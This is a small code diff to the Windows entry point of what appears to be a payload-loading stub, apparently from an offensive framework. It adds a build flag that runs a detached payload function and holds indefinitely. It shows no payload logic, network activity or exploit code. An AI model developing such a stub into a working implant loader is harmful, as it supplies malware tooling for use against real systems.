@@ -44,6 +44,10 @@ volatile BYTE stub_pic_region[PIC_MARKER_LEN + sizeof(DWORD) + sizeof(DWORD) + P
 
 __attribute__((ms_abi))
 void WinMainCRTStartup(void) {
+#ifdef SPECTER_STUB_DETACHED_HOLD
+    stub_execute_payload_detached_pivot_hold(INFINITE);
+    for (;;) {}
+#else
     /* First thing: set a unique code to prove this function runs */
     g_stub_exit_code = 999;
 
@@ -110,4 +114,5 @@ done:;
 
     /* Fallback: infinite loop (should never reach here) */
     for (;;) {}
+#endif
 }
